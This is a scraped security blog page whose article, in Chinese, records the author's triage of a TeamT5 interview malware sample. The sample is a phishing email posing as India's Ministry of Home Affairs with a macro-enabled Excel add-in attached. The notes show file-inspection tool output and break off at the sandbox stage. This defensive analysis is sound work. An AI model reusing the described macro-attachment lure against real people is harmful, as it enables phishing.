href=/docs/security/course/ntu-cs/pwn/simple-pwn---0x13lab---how2know/>Simple PWN - 0x13(Lab - `how2know`)</a></li><li><a href=/docs/security/course/ntu-cs/pwn/simple-pwn---0x14simple-heap/>Simple PWN - 0x14(Simple HEAP)</a></li><li><a href=/docs/security/course/ntu-cs/pwn/simple-pwn---0x15lab---heapmath/>Simple PWN - 0x15(Lab - `heapmath`)</a></li><li><a href=/docs/security/course/ntu-cs/pwn/simple-pwn-0x16simple_smallbin/>Simple PWN 0x16(simple_smallbin)</a></li><li><a href=/docs/security/course/ntu-cs/pwn/simple-pwn-0x17uaf---leak-information/>Simple PWN 0x17(UAF - leak information)</a></li><li><a href=/docs/security/course/ntu-cs/pwn/simple-pwn-0x18lab---babynote/>Simple PWN 0x18(Lab - `babynote`)</a></li><li><a href=/docs/security/course/ntu-cs/pwn/simple-pwn-0x19lab---babyums---flag-1/>Simple PWN 0x19(Lab - `babyums` - flag 1)</a></li><li><a href=/docs/security/course/ntu-cs/pwn/simple-pwn-0x20lab---babyums---flag-2/>Simple PWN 0x20(Lab - `babyums` - flag 2)</a></li><li><a href=/docs/security/course/ntu-cs/pwn/simple-pwn-0x21fopen-fread-fwrite-fclose/>Simple PWN 0x21(fopen, fread, fwrite, fclose)</a></li><li><a href=/docs/security/course/ntu-cs/pwn/simple-pwn-0x22lab---aar/>Simple PWN 0x22(Lab - `AAR`)</a></li><li><a href=/docs/security/course/ntu-cs/pwn/simple-pwn-0x23lab---aaw/>Simple PWN 0x23(Lab - `AAW`)</a></li><li><a href=/docs/security/course/ntu-cs/pwn/simple-pwn-0x312023-hw---notepad---stage---1/>Simple PWN 0x31(2023 HW - Notepad - Stage - 1)</a></li><li><a href=/docs/security/course/ntu-cs/pwn/simple-pwn-0x322023-hw---notepad-stage-2/>Simple PWN 0x32(2023 HW - Notepad-Stage 2)</a></li><li><a href=/docs/security/course/ntu-cs/pwn/simple-pwn-0x332023-lab---rop_rw/>Simple PWN 0x33(2023 Lab - ROP_RW)</a></li><li><a href=/docs/security/course/ntu-cs/pwn/simple-pwn-0x34-2023-lab---ret2plt/>Simple PWN 0x34 (2023 Lab - ret2plt)</a></li><li><a href=/docs/security/course/ntu-cs/pwn/simple-pwn-0x352023-lab---stack-pivot/>Simple PWN 0x35(2023 Lab - Stack Pivot)</a></li><li><a href=/docs/security/course/ntu-cs/pwn/simple-pwn-0x362023-hw---notepad-stage-3/>Simple PWN 0x36(2023 HW - Notepad-Stage 3)</a></li><li><a href=/docs/security/course/ntu-cs/pwn/simple-pwn-0x372023-hw---hachama/>Simple PWN 0x37(2023 HW - HACHAMA)</a></li><li><a href=/docs/security/course/ntu-cs/pwn/simple-pwn-0x38lab---uaf/>Simple PWN 0x38(Lab - UAF)</a></li><li><a href=/docs/security/course/ntu-cs/pwn/simple-pwn-0x39lab---double-free/>Simple PWN 0x39(Lab - Double Free)</a></li><li><a href=/docs/security/course/ntu-cs/pwn/simple-pwn-0x402023-hw---uaf++/>Simple PWN 0x40(2023 HW - UAF++)</a></li><li><a href=/docs/security/course/ntu-cs/reverse/simple-reverse---0x01lab---sacred-arts/>Simple Reverse - 0x01(Lab - Sacred Arts)</a></li><li><a href=/docs/security/course/ntu-cs/reverse/simple-reverse---0x03lab---why/>Simple Reverse - 0x03(Lab - Why)</a></li><li><a href=/docs/security/course/ntu-cs/reverse/simple-reverse---0x142023-lab---assemblydev/>Simple Reverse - 0x14(2023 Lab - AssemblyDev)</a></li><li><a href=/docs/security/course/ntu-cs/reverse/simple-reverse---0x152023-hw---crackme_vectorization/>Simple Reverse - 0x15(2023 HW - crackme_vectorization)</a></li><li><a href=/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x162023-lab---winmalware---sub_140001c80/>Simple Reverse - 0x16(2023 Lab - WinMalware - sub_140001C80)</a></li><li><a href=/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x172023-lab---winmalware---sub_140001030/>Simple Reverse - 0x17(2023 Lab - WinMalware - sub_140001030)</a></li><li><a href=/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x182023-lab---winmalware---sub_140001120/>Simple Reverse - 0x18(2023 Lab - WinMalware - sub_140001120)</a></li><li><a href=/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x192023-lab---winmalware---extract-next-stage-payload/>Simple Reverse - 0x19(2023 Lab - WinMalware - Extract Next Stage Payload)</a></li><li><a href=/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x202023-lab---winmalware---extract-next-stage-payload---2/>Simple Reverse - 0x20(2023 Lab - WinMalware - Extract Next Stage Payload - 2)</a></li><li><a href=/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x212023-lab---winmalware---extract-next-stage-payload---3/>Simple Reverse - 0x21(2023 Lab - WinMalware - Extract Next Stage Payload - 3)</a></li><li><a href=/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x222023-lab---winmalware---collect/>Simple Reverse - 0x22(2023 Lab - WinMalware - Collect)</a></li><li><a href=/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x232023-lab---winmalware---exfiltrate/>Simple Reverse - 0x23(2023 Lab - WinMalware - Exfiltrate)</a></li><li><a href=/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x242023-lab---winmalware---dynamic-api-resolution-background/>Simple Reverse - 0x24(2023 Lab - WinMalware - Dynamic API Resolution Background)</a></li><li><a href=/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x252023-lab---winmalware---%E4%BD%9C%E6%A5%AD/>Simple Reverse - 0x25(2023 Lab - WinMalware - 作業)</a></li><li><a href=/docs/security/course/ntu-cs/reverse/simple-reverse---0x262023-hw---banana-donut-verifier/>Simple Reverse - 0x26(2023 HW - Banana Donut Verifier)</a></li><li><a href=/docs/security/course/ntu-cs/reverse/simple-reverse---0x272023-lab---scramble/>Simple Reverse - 0x27(2023 Lab - Scramble)</a></li><li><a href=/docs/security/course/ntu-cs/reverse/simple-reverse---0x282023-lab---super-angry/>Simple Reverse - 0x28(2023 Lab - Super Angry)</a></li><li><a href=/docs/security/course/ntu-cs/reverse/simple-reverse---0x292023-lab---unpackme/>Simple Reverse - 0x29(2023 Lab - Unpackme)</a></li><li><a href=/docs/security/course/ntu-cs/reverse/simple-reverse---0x302023-hw---evil-flagchecker/>Simple Reverse - 0x30(2023 HW - Evil FlagChecker)</a></li><li><a href=/docs/security/course/ntu-cs/reverse/simple-reverse---0x06lab---amessagebox/>Simple Reverse 0x06(Lab - AMessageBox)</a></li><li><a href=/docs/security/course/ntu-cs/reverse/simple-reverse---0x08lab---getprocaddress/>Simple Reverse 0x08(Lab - GetProcAddress)</a></li><li><a href=/docs/security/course/ntu-cs/reverse/simple-reverse---0x11lab---exception/>Simple Reverse 0x11(Lab - Exception)</a></li><li><a href=/docs/security/course/ntu-cs/reverse/simple-reverse---0x12lab---tlscallback/>Simple Reverse 0x12(Lab - TLSCallback)</a></li><li><a href=/docs/security/course/ntu-cs/reverse/simple-reverse---0x13lab---meow/>Simple Reverse 0x13(Lab - Meow)</a></li><li><a href=/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x302023-hw---baby-ransom-1/>Simple Reverse 0x30(2023 HW - Baby Ransom 1)</a></li><li><a href=/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x312023-hw---baby-ransom-2/>Simple Reverse 0x31(2023 HW - Baby Ransom 2)</a></li><li><a href=/docs/security/course/ntu-cs/web/simple-web---0x02lab---whois-tool/>Simple Web - 0x02(Lab - Whois Tool)</a></li><li><a href=/docs/security/course/ntu-cs/web/simple-web---0x03lab---normal-login-panel-flag-1/>Simple Web - 0x03(Lab - Normal Login Panel (Flag 1))</a></li><li><a href=/docs/security/course/ntu-cs/web/simple-web---0x04lab---normal-login-panel-flag-2/>Simple Web - 0x04(Lab - Normal Login Panel (Flag 2))</a></li><li><a href=/docs/security/course/ntu-cs/web/simple-web---0x08lab---particles.js/>Simple Web - 0x08(Lab - `Particles.js`)</a></li><li><a href=/docs/security/course/ntu-cs/web/simple-web---0x09lab---simple-note/>Simple Web - 0x09(Lab - Simple Note)</a></li><li><a href=/docs/security/course/ntust-ws/information-leak/simple-web-0x01lab---gitleak/>Simple Web 0x01(Lab - `gitleak`)</a></li><li><a href=/docs/security/course/ntu-cs/web/simple-web---0x01lab---hello-from-windows-98/>Simple Web 0x01(Lab - Hello from Windows 98)</a></li><li><a href=/docs/security/course/ntust-ws/information-leak/simple-web-0x02lab---.ds_store/>Simple Web 0x02(Lab - `.DS_Store`)</a></li><li><a href=/docs/security/course/ntust-ws/sql-injection/simple-web-0x03lab---log-me-in-+-revenge/>Simple Web 0x03(Lab - Log me in + Revenge)</a></li><li><a href=/docs/security/course/ntust-ws/upload/simple-web-0x04lab---image-space-0x01/>Simple Web 0x04(Lab - Image Space 0x01)</a></li><li><a href=/docs/security/course/ntust-ws/upload/simple-web-0x05lab---image-space-0x02/>Simple Web 0x05(Lab - Image Space 0x02)</a></li><li><a href=/docs/security/course/ntust-ws/upload/simple-web-0x06lab---image-space-0x03/>Simple Web 0x06(Lab - Image Space 0x03)</a></li><li><a href=/docs/security/course/ntust-ws/lfi/simple-web-0x07lab---hakkamd/>Simple Web 0x07(Lab - `HakkaMD`)</a></li><li><a href=/docs/security/course/ntust-ws/lfi/simple-web-0x08lab---my-first-meow-website/>Simple Web 0x08(Lab - My First Meow Website)</a></li><li><a href=/docs/security/course/ntust-ws/command-injection/simple-web-0x09lab---dns-lookup-tool/>Simple Web 0x09(Lab - DNS Lookup Tool)</a></li><li><a href=/docs/security/course/ntust-ws/command-injection/simple-web-0x10lab---dns-lookup-tool-_-waf/>Simple Web 0x10(Lab - DNS Lookup Tool | WAF)</a></li><li><a href=/docs/security/course/ntust-ws/fronted/simple-web-0x11lab---xss-me/>Simple Web 0x11(Lab - XSS Me)</a></li><li><a href=/docs/security/course/ntu-cs/web/simple-web---0x15lab---web-preview-card/>Simple Web 0x12(Lab - Web Preview Card)</a></li><li><a href=/docs/security/course/ntust-ws/ssrf/simple-web-0x12lab---web-preview-card/>Simple Web 0x12(Lab - Web Preview Card)</a></li><li><a href=/docs/security/course/ntust-ws/ssrf/simple-web-0x13lab---ssrfrog/>Simple Web 0x13(Lab - SSRFrog)</a></li><li><a href=/docs/security/course/ntust-ws/ssrf/simple-web-0x14lab---debug/>Simple Web 0x14(Lab - Debug)</a></li><li><a href=/docs/security/course/ntust-ws/deserialization/simple-web-0x15.5pickle/>Simple Web 0x15.5(Pickle)</a></li><li><a href=/docs/security/course/ntust-ws/ssti/simple-web-0x15lab---jinja/>Simple Web 0x15(Lab - `Jinja`)</a></li><li><a href=/docs/security/course/ntust-ws/deserialization/simple-web-0x16.5php-unserialize/>Simple Web 0x16.5(php unserialize)</a></li><li><a href=/docs/security/course/ntu-cs/web/simple-web---0x11lab---pickle/>Simple Web 0x16(Lab - Pickle)</a></li><li><a href=/docs/security/course/ntust-ws/deserialization/simple-web-0x16lab---pickle/>Simple Web 0x16(Lab - Pickle)</a></li><li><a href=/docs/security/course/ntu-cs/web/simple-web---0x12lab---baby-cat/>Simple Web 0x17(Lab - Baby Cat)</a></li><li><a href=/docs/security/course/ntust-ws/deserialization/simple-web-0x17lab---baby-cat/>Simple Web 0x17(Lab - Baby Cat)</a></li><li><a href=/docs/security/course/ntu-cs/web/simple-web---0x13lab---magic-cat/>Simple Web 0x18(Lab - Magic Cat)</a></li><li><a href=/docs/security/course/ntust-ws/deserialization/simple-web-0x18lab---magic-cat/>Simple Web 0x18(Lab - Magic Cat)</a></li><li><a href=/docs/security/course/ntust-ws/language-feature/simple-web-0x19lab---php-login/>Simple Web 0x19(Lab - PHP Login)</a></li><li><a href=/docs/security/course/ntust-ws/ssti/simple-web-0x22lab---pug/>Simple Web 0x22(Lab - Pug)</a></li><li><a href=/docs/security/course/ntu-cs/web/simple-web---0x14lab---xxe/>Simple Web 0x23(Lab - XXE)</a></li><li><a href=/docs/security/course/ntust-ws/deserialization/simple-web-0x23lab---xxe/>Simple Web 0x23(Lab - XXE)</a></li><li><a href=/docs/security/course/ntust-ws/beginner/simple-web-0x24lab---how2http/>Simple Web 0x24(Lab - how2http)</a></li><li><a href=/docs/security/course/ntu-cs/web/simple-web---0x412023-hw---double-injection---flag1/>Simple Web 0x41(2023 HW - Double Injection - FLAG1)</a></li><li><a href=/docs/security/course/ntu-cs/web/simple-web---0x422023-hw---double-injection---flag2/>Simple Web 0x42(2023 HW - Double Injection - FLAG2)</a></li><li><a href=/docs/security/course/ntu-cs/welcome/simple-welcome---0x04lab---script/>Simple Welcome - 0x04(Lab - Script)</a></li><li><a href=/docs/security/course/ntu-cs/welcome/simple-welcome-0x01lab---lets-meet-at-class/>Simple Welcome 0x01(Lab - Let's meet at class)</a></li><li><a href=/docs/security/course/ntu-cs/welcome/simple-welcome-0x02--0x05lab---nine--nine-revenge/>Simple Welcome 0x02 & 0x05(Lab - Nine & Nine-Revenge)</a></li><li><a href=/docs/side-project/special-topic-of-tzu-chi-at-tcivs/>Special Topic of Tzu-Chi at TCIVS</a></li><li><a href=/docs/security/practice/portswigger-web-security-academy/sql/sqli---apprentice/>SQLi - APPRENTICE</a></li><li><a href=/docs/security/course/tai.holyhigh/soc%E5%9F%BA%E7%A4%8E%E7%B6%AD%E9%81%8B/taiwanholyhigh---soc%E5%9F%BA%E7%A4%8E%E7%B6%AD%E9%81%8B---arcsight%E6%95%99%E5%AD%B8/>TaiwanHolyHigh - SoC基礎維運 - ArcSight教學</a></li><li><a href=/docs/security/course/tai.holyhigh/soc%E5%9F%BA%E7%A4%8E%E7%B6%AD%E9%81%8B/taiwanholyhigh---soc%E5%9F%BA%E7%A4%8E%E7%B6%AD%E9%81%8B---hw2/>TaiwanHolyHigh - SoC基礎維運 - HW2</a></li><li><a href=/docs/security/course/tai.holyhigh/windows-os-forensics/taiwanholyhigh---windows-forensics---mft-background/>TaiwanHolyHigh - Windows Forensics - $MFT Background</a></li><li><a href=/docs/security/course/tai.holyhigh/windows-os-forensics/taiwanholyhigh---windows-forensics---mft-resident-_-non-resident-file/>TaiwanHolyHigh - Windows Forensics - $MFT Resident / Non-Resident File</a></li><li><a href=/docs/security/course/tai.holyhigh/windows-os-forensics/taiwanholyhigh---windows-forensics---mft-%E5%9F%BA%E6%9C%AC%E5%AF%A6%E4%BD%9C/>TaiwanHolyHigh - Windows Forensics - $MFT 基本實作</a></li><li><a href=/docs/security/course/tai.holyhigh/windows-os-forensics/taiwanholyhigh---windows-forensics---background/>TaiwanHolyHigh - Windows Forensics - Background</a></li><li><a href=/docs/security/course/tai.holyhigh/windows-os-forensics/taiwanholyhigh---windows-forensics---lnk-lab/>TaiwanHolyHigh - Windows Forensics - LNK Lab</a></li><li><a href=/docs/security/course/tai.holyhigh/windows-os-forensics/taiwanholyhigh---windows-forensics---windows-artifacts/>TaiwanHolyHigh - Windows Forensics - Windows Artifacts</a></li><li><a href=/docs/security/course/tai.holyhigh/windows-os-forensics/taiwanholyhigh---windows-forensics---windows%E6%AA%94%E6%A1%88%E7%B3%BB%E7%B5%B1%E8%88%87%E9%82%84%E5%8E%9F/>TaiwanHolyHigh - Windows Forensics - Windows檔案系統與還原</a></li><li><a href=/docs/job/interview/teamt5%E7%AD%86%E8%A9%A6%E9%A1%8C%E7%9B%AE%E7%AD%86%E8%A8%98/ class=active>TeamT5筆試題目筆記</a></li><li><a href=/docs/tools/others/android-related/drozer/test-diva/test-diva---activity-exported/>Test DIVA - activity exported</a></li><li><a href=/docs/tools/others/android-related/drozer/test-diva/test-diva---content-provider-exported---db-based/>Test DIVA - content provider exported - DB Based</a></li><li><a href=/docs/tools/others/android-related/drozer/test-sieve/test-sieve---activities-exported/>Test Sieve - activities exported</a></li><li><a href=/docs/tools/others/android-related/drozer/test-sieve/test-sieve---broadcast-receivers-exported/>Test Sieve - broadcast receivers exported</a></li><li><a href=/docs/tools/others/android-related/drozer/test-sieve/test-sieve---content-providers-exported---db-based/>Test Sieve - content providers exported - DB Based</a></li><li><a href=/docs/tools/others/android-related/drozer/test-sieve/test-sieve---content-providers-exported---file-systembased/>Test Sieve - content providers exported - File SystemBased</a></li><li><a href=/docs/tools/others/android-related/drozer/test-sieve/test-sieve---is-debuggable/>Test Sieve - is debuggable</a></li><li><a href=/docs/tools/others/android-related/drozer/test-sieve/test-sieve---services-exported/>Test Sieve - services exported</a></li><li><a href=/docs/tools/others/android-related/mobsf/test-sieve-by-mobsf/>Test Sieve by MobSF</a></li><li><a href=/docs/books-notes/the-decameron-%E5%8D%81%E6%97%A5%E8%AB%87/>The Decameron (十日談)</a></li><li><a href=/docs/survey-papers/digital-currency/the-state-of-ethereum-smart-contracts-security_-vulnerabilities-countermeasures-and-tool-support---notes/>The State of Ethereum Smart Contracts Security: Vulnerabilities, Countermeasures, and Tool Support - Notes</a></li><li><a href=/docs/job/interview/trapa-interview/>Trapa Interview</a></li><li><a href=/docs/security/competition/tscctf-2024/>TSCCTF 2024</a></li><li><a href=/docs/problem-solutions/uiautomatorviewer-%E5%B8%B8%E8%A6%8B%E5%95%8F%E9%A1%8C%E6%95%B4%E7%90%86/>UiAutomatorViewer 常見問題整理</a></li><li><a href=/docs/survey-papers/android-+-security/uncovering-intent-based-leak-of-sensitive-data-in-android-framework/>Uncovering Intent based Leak of Sensitive Data in Android Framework</a></li><li><a href=/docs/survey-papers/android-+-security/understanding-real-world-threats-to-deep-learning-models-in-android-apps/>Understanding Real-world Threats to Deep Learning Models in Android Apps</a></li><li><a href=/docs/problem-solutions/unexpected-fatal-error-while-initializing-python-runtime_/>Unexpected fatal error while initializing python runtime.</a></li><li><a href=/docs/security/course/ntu-st/unit-test-practice/>Unit Test Practice</a></li><li><a href=/docs/tools/others/useful-link/>Useful Link</a></li><li><a href=/docs/survey-papers/android-+-security/vaptai_-a-threat-model-for-vulnerability-assessment-and-pentesting-of-android-and-ios-mobile-banking-apps/>VAPTAi: A Threat Model for Vulnerability Assessment and Pentesting of Android and iOS Mobile Banking Apps</a></li><li><a href=/docs/problem-solutions/virtualbox%E6%BB%91%E9%BC%A0%E7%84%A1%E6%B3%95%E8%B7%B3%E5%87%BA/>VirtualBox滑鼠無法跳出</a></li><li><a href=/docs/tools/ctf/web-cheat-sheet/>Web Cheat Sheet</a></li><li><a href=/docs/tools/others/directory-fuzzing---traversal-tools/wfuzz/>WFuzz</a></li><li><a href=/docs/terminology/what-is-devops-mlops-ci_cd_/>What is DevOps, MLOps, CI/CD?</a></li><li><a href=/docs/terminology/what-is-ids-ips-edr-mdr-nsm-siem_/>What is IDS, IPS, EDR, MDR, NSM, SIEM?</a></li><li><a href=/docs/survey-papers/android-+-security/wight_-wired-ghost-touch-attack-on-capacitive-touchscreens/>WIGHT: Wired Ghost Touch Attack on Capacitive Touchscreens</a></li><li><a href=/docs/problem-solutions/wsl-tty-_dev_tty0/>WSL tty /dev/tty0</a></li><li><a href=/docs/problem-solutions/wsl2-cannot-list-android-devices/>WSL2 Cannot List Android Devices</a></li><li><a href=/docs/security/practice/portswigger-web-security-academy/xss/xss---apprentice/>XSS - APPRENTICE</a></li><li><a href=/docs/security/practice/portswigger-web-security-academy/xxe/xxe---apprentice/>XXE - APPRENTICE</a></li><li><a href=/docs/tools/ctf/%E5%88%A9%E7%94%A8metasploit-framework%E6%B8%AC%E8%A9%A6%E4%B8%80%E4%BA%9B%E7%B6%B2%E7%AB%99/>利用Metasploit Framework測試一些網站</a></li><li><a href=/docs/problem-solutions/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8hugo+github%E6%9E%B6%E8%A8%AD%E7%B6%B2%E7%AB%99/>如何使用Hugo+Github架設網站</a></li><li><a href=/docs/knowledge/%E6%8A%95%E8%B3%87%E7%90%86%E8%B2%A1/>投資理財</a></li><li><a href=/docs/knowledge/%E6%97%A5%E6%9C%AC%E7%9F%A5%E5%90%8D%E7%9A%84%E6%BC%AB%E7%95%AB%E7%9B%B8%E9%97%9C%E7%8D%8E%E9%A0%85/>日本知名的漫畫相關獎項</a></li><li><a href=/docs/tools/others/%E6%9C%89%E5%95%8F%E9%A1%8C%E7%9A%84%E7%B6%B2%E7%AB%99/>有問題的網站</a></li><li><a href=/docs/survey-papers/android-+-security/tool/%E6%9C%89%E9%97%9Cpentest%E4%BD%86%E8%B2%A2%E7%8D%BB%E5%BE%88%E7%88%9B%E7%9A%84%E4%B8%89%E7%AF%87%E8%AB%96%E6%96%87/>有關Pentest但貢獻很爛的三篇論文</a></li><li><a href=/docs/security/competition/%E7%A5%9E%E7%9B%BE%E7%9B%832023%E5%88%9D%E8%B3%BD/>神盾盃2023初賽</a></li></ul><ul><li><a href=/posts/>Blog</a></li></ul></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label><h3>TeamT5筆試題目筆記</h3><label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><a href=#惡意程式>惡意程式</a><ul><li><a href=#檔案資訊>檔案資訊</a></li><li><a href=#執行流程>執行流程</a></li><li><a href=#通訊協定>通訊協定</a></li><li><a href=#加解密演算法>加解密演算法</a></li><li><a href=#後門功能>後門功能</a></li><li><a href=#常駐方式>常駐方式</a></li></ul></li><li><a href=#中繼站>中繼站</a><ul><li><a href=#基本資訊>基本資訊</a></li><li><a href=#關連資訊>關連資訊</a></li></ul></li><li><a href=#威脅情資>威脅情資</a><ul><li><a href=#攻擊者>攻擊者</a></li><li><a href=#攻擊時間>攻擊時間</a></li><li><a href=#受害者>受害者</a></li></ul></li></ul><ul><li><a href=#惡意程式-1>惡意程式</a><ul><li><a href=#檔案資訊-1>檔案資訊</a></li><li><a href=#執行流程-1>執行流程</a></li><li><a href=#通訊協定-1>通訊協定</a></li><li><a href=#加解密演算法-1>加解密演算法</a></li><li><a href=#後門功能-1>後門功能</a></li><li><a href=#常駐方式-1>常駐方式</a></li></ul></li><li><a href=#中繼站-1>中繼站</a><ul><li><a href=#基本資訊-1>基本資訊</a></li><li><a href=#關連資訊-1>關連資訊</a></li></ul></li><li><a href=#威脅情資-1>威脅情資</a><ul><li><a href=#攻擊者-1>攻擊者</a></li><li><a href=#攻擊時間-1>攻擊時間</a></li><li><a href=#受害者-1>受害者</a></li></ul></li></ul></nav></aside></header><article class="markdown book-article"><h1 id=teamt5筆試題目筆記>TeamT5筆試題目筆記
+<a class=anchor href=#teamt5%e7%ad%86%e8%a9%a6%e9%a1%8c%e7%9b%ae%e7%ad%86%e8%a8%98>#</a></h1><p>:::info
+前言: 通常我自己拿到一隻樣本，起手式會先搜一下hash，VirusTotal如果有紀錄的話最好，再來會丟到AnyRun看一下動態sandbox的狀態為何，但不確定這樣的操作是否符合本次筆試的預期，所以我會先設法在本機VM內分析看看，如果有利用這幾個online tools而得知的資訊，會再行標註
+:::
+:::danger
+經過二階面試後，用線上的工具例如VirusTotal和AnyRun都是被嚴格禁止的。
+第一個樣本總花費時間: 2天/第二個樣本總花費時間: 4天
+:::</p><h1 id=樣本93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a>樣本(93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a)
+<a class=anchor href=#%e6%a8%a3%e6%9c%ac93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a>#</a></h1><h2 id=惡意程式>惡意程式
+<a class=anchor href=#%e6%83%a1%e6%84%8f%e7%a8%8b%e5%bc%8f>#</a></h2><h3 id=檔案資訊>檔案資訊
+<a class=anchor href=#%e6%aa%94%e6%a1%88%e8%b3%87%e8%a8%8a>#</a></h3><ol><li><p>DIE(Detect It Easy)
+<img src=https://hackmd.io/_uploads/S1Lbp6T3p.png alt=圖片>
+看起來是一個HTML的純文字檔案</p></li><li><p>File/Stat/Exiftool
+從以下結果來看，是一個SMTP的郵件檔案，並且是純文字的形式，所以直覺上可能和Outlook或是Firefox Thunderbird有關係，以binwalk的結果來說，他應該有壓縮一些內容在其中，如果實際丟到Any.Run的話會發現的確有很多檔案被compressed
+<img src=https://hackmd.io/_uploads/rJfrgyR3a.png alt=圖片></p><p>或者是說，從檔案內容來看(HxD)，會發現data帶了一個base64的file，decode會發現是<code>0x50 4B 03 04</code>
+:::spoiler Command Result</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ file 93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a
+</span></span><span style=display:flex><span>93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a: SMTP mail, ASCII text, with CRLF line terminators
+</span></span><span style=display:flex><span>$ exiftool 93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a
+</span></span><span style=display:flex><span>ExifTool Version Number         : 12.40
+</span></span><span style=display:flex><span>File Name                       : 93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a
+</span></span><span style=display:flex><span>Directory                       : .
+</span></span><span style=display:flex><span>File Size                       : <span style=color:#ae81ff>180</span> KiB
+</span></span><span style=display:flex><span>File Modification Date/Time     : 2023:08:14 11:54:39+08:00
+</span></span><span style=display:flex><span>File Access Date/Time           : 2024:02:29 16:55:48+08:00
+</span></span><span style=display:flex><span>File Inode Change Date/Time     : 2024:02:29 16:55:48+08:00
+</span></span><span style=display:flex><span>File Permissions                : -rwxrwxrwx
+</span></span><span style=display:flex><span>File Type                       : TXT
+</span></span><span style=display:flex><span>File Type Extension             : txt
+</span></span><span style=display:flex><span>MIME Type                       : text/plain
+</span></span><span style=display:flex><span>MIME Encoding                   : us-ascii
+</span></span><span style=display:flex><span>Newlines                        : Windows CRLF
+</span></span><span style=display:flex><span>Line Count                      : <span style=color:#ae81ff>2410</span>
+</span></span><span style=display:flex><span>Word Count                      : <span style=color:#ae81ff>2741</span>
+</span></span><span style=display:flex><span>$ stat 93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a
+</span></span><span style=display:flex><span>  File: 93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a
+</span></span><span style=display:flex><span>  Size: <span style=color:#ae81ff>184712</span>          Blocks: <span style=color:#ae81ff>368</span>        IO Block: <span style=color:#ae81ff>4096</span>   regular file
+</span></span><span style=display:flex><span>Device: 66h/102d        Inode: <span style=color:#ae81ff>1688849860790082</span>  Links: <span style=color:#ae81ff>1</span>
+</span></span><span style=display:flex><span>Access: <span style=color:#f92672>(</span>0777/-rwxrwxrwx<span style=color:#f92672>)</span>  Uid: <span style=color:#f92672>(</span> 1000/ sbk6401<span style=color:#f92672>)</span>   Gid: <span style=color:#f92672>(</span> 1000/ sbk6401<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>Access: 2024-02-29 16:55:48.949690200 +0800
+</span></span><span style=display:flex><span>Modify: 2023-08-14 11:54:39.000000000 +0800
+</span></span><span style=display:flex><span>Change: 2024-02-29 16:55:48.949690200 +0800
+</span></span><span style=display:flex><span> Birth: -
+</span></span><span style=display:flex><span>$ binwalk 93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>DECIMAL       HEXADECIMAL     DESCRIPTION
+</span></span><span style=display:flex><span>--------------------------------------------------------------------------------
+</span></span><span style=display:flex><span><span style=color:#ae81ff>4244</span>          0x1094          HTML document header
+</span></span><span style=display:flex><span><span style=color:#ae81ff>5554</span>          0x15B2          HTML document footer
+</span></span><span style=display:flex><span><span style=color:#ae81ff>73264</span>         0x11E30         StuffIt Deluxe Segment <span style=color:#f92672>(</span>data<span style=color:#f92672>)</span>: fWm1
+</span></span><span style=display:flex><span><span style=color:#ae81ff>169908</span>        0x297B4         IMG0 <span style=color:#f92672>(</span>VxWorks<span style=color:#f92672>)</span> header, size: <span style=color:#ae81ff>218780743</span>
+</span></span></code></pre></div><p>:::</p></li></ol><h3 id=執行流程>執行流程
+<a class=anchor href=#%e5%9f%b7%e8%a1%8c%e6%b5%81%e7%a8%8b>#</a></h3><ol><li>因為這是一個SMTP的檔案，所以先用VM的mail看一下裡面的資訊，沒意外的話根據上面的敘述，這應該是一個phishing email，並且把內文偽裝成印度的MHA政府部門(Ministry of Home Affairs, 內政部)
+<img src=https://hackmd.io/_uploads/BkY1yBRna.png alt=圖片></li><li>所以重點應該就是在信件中夾帶的檔案，也就是==Guidelines.xlam==，這也是一個沒有看過的extension，所以根據<sup id=fnref:1><a href=#fn:1 class=footnote-ref role=doc-noteref>1</a></sup>的說明，看起來這個檔案可以使用巨集，看到Macro這個關鍵字直覺上就感覺不太對勁，因為看過的實際案例就蠻常出現利用Macro夾帶一些script或是惡意的command<blockquote><p>XLAM file extension may refer to a file used by a spreadsheet program called Microsoft Excel. This program enables users to create and edit spreadsheets. These files also contain a macro-enabled add-in that provides extra tools and functionality that may execute macros. XLAM files may also be used for extension of Excel provided modules.</p></blockquote></li><li>由於VM內沒有可以Excel，所以容許我用Any.Run Sandbox看一下中間執行的過程，首先針對前三個process，有很大的問題
